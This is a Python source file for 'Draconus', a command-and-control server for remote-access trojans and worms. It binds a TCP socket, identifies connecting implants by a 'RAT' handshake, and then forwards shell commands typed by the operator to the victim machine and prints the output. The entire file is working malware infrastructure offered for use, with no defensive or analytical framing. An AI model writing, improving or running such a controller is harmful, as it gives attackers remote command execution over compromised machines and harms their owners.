import socket

SERVER = '192.168.100.16'
PORT = 5050
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

# length of message (256 bytes)
RAW_LEN = 256

# length of output message (4 kb)
OUT_LEN = 4096

# length of response message (1 bytes)
RAW_ERROR = 1

# response message OK ( No Error)
RAW_NoE = '0'.encode(FORMAT)

# types of tools (viruses, rats, worms, etc.)
# Draconus identify types of worms
TYPE_WORM = 'WORM'
TYPE_RAT = 'RAT'

# message to disconnect
MSG_DISC = 'MSG_DISC'

# message uses to send response (it is OK)
MSG_OK = 'MSG_OK'

# message to exit the shell
SHELL_EXIT = 'EXIT'

class Msg:
    def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
        self.pmsg = msg
        self.formats = formats
        if len(msg) > raw_len:
            self.raw_len = len(msg)
        else:
            self.raw_len = raw_len
        
        self.msg = self.make(self.pmsg)
        self.len = self.make(len(self.pmsg), raw_len=RAW_LEN)
      

    def make(self, msg, raw_len=None):
        nmsg = str(msg).encode(self.formats)
        if len(nmsg) < self.raw_len:
            raw_len = RAW_LEN
        else:
            raw_len = self.raw_len
        while len(nmsg) < raw_len:
            nmsg += b' '
        return nmsg

class Draconus:

    def __init__(self):
        print('[SYSTEM] Draconus starting ...')
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # prevent "error 98: adress already in use"
        # can reuse adress
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.server.bind(ADDR)
        self.conn = None
        self.addr = None

        # synergy represent type of connected worm
        self.synergy = None

    
    def start(self):
        self.server.listen(6)
        print('*********************************************************')
        print(f'[DRACONUS] Server listening on {SERVER}')
        while True:
            print('[DRACONUS] ------------------------------------------------')
            print('[DRACONUS] Waiting for connection')
            self.conn, self.addr = self.server.accept()
            print(f'[DRACONUS] New connection from: {self.addr[0]}')

            if self.who_is() == False:
                print('[DRACONUS] Unknown type of worm ')
                print(f'[DRACONUS] Disconnect {self.addr[0]} .... ')
                self.conn.close()
                continue

            self.handle_RAT()

        self.conn.close()
        self.server.close()



            

    # recive standard pocket (message) and send response (1 byte)
    # default length is 256 bytes
    def recive_pocket(self):
        try:
            rec = self.conn.recv(RAW_LEN)
        except Exception as e:
            print('[DRACONUS] Error when recive pocket: ', e)
            return 0
        if rec:
            rec = rec.decode(FORMAT).rstrip(' ')
            print('REC: ', rec)
            output = rec

            try:
                self.conn.send(RAW_NoE)
            except Exception as e:
                print('[DRACONUS] Error when send response: ', e)
                return 0
            return output

    # send default pocket (message) to worm and recive response (1 bytes)
    # default length is 256 bytes
    def send_pocket(self, msg):
        send = Msg(msg)
        try:
            self.conn.send(send.msg)
        except:
            pass
        try:
            self.conn.recv(RAW_ERROR)
        except:
            pass


    # recive a output message from worm and send response (1 bytes). Result of send command.
    # default length is 4kb (4096)

    def recive_output(self):
        output = None
        try:
            output = self.conn.recv(OUT_LEN)
        except Exception as e:
            print('[DRACONUS] Error when recive output ')
            return None
        if output:
            output = output.decode(FORMAT).rstrip(' ')

        try:
            self.conn.send(RAW_NoE)
        except Exception as e:
            print('[DRACONUS] Error when send response ')

        return output

    
    # Identification of worm type
    def who_is(self):
        who = self.recive_pocket()
        if who:
            if who == TYPE_RAT:
                self.synergy = TYPE_RAT
            else:
                self.synergy = None
                return False

            print(f'[DRACONUS] This is {self.synergy} !!! ')
            return True


    def handle_RAT(self):
        command = None
        while command != SHELL_EXIT:
            print(f'[DRACONUS] Put order to {self.synergy} [{self.addr[0]}]')
            print('[DRACONUS] << ', end='')
            command = input()
            
            self.send_pocket(str(command))
            output = self.recive_output()
            print(f'[DRACONUS] ********************* NEW MESSAGE from {self.synergy} ******************')
            print(f'[{self.synergy}]\n{output}')
            print('[DRACONUS] *************************************************************')


#### START
DRACONUS = Draconus()
DRACONUS.start()

